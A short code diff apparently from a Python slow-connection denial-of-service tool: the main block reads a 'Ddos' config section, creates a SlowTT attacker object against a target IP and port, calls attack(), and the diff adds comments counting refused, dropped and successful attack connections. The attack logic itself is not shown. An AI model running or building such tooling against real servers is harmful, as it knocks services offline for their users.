@@ -34,3 +34,7 @@ if __name__ == '__main__':
     connections = config.getint('Ddos', 'connections')
     slowtt = SlowTT(ip_address, port, keepalive, connections)
     slowtt.attack()
+
+    # connection refuse : 36789
+    # connection accept and dropped later: 27431
+    # connection accept and attack carried out: 5590
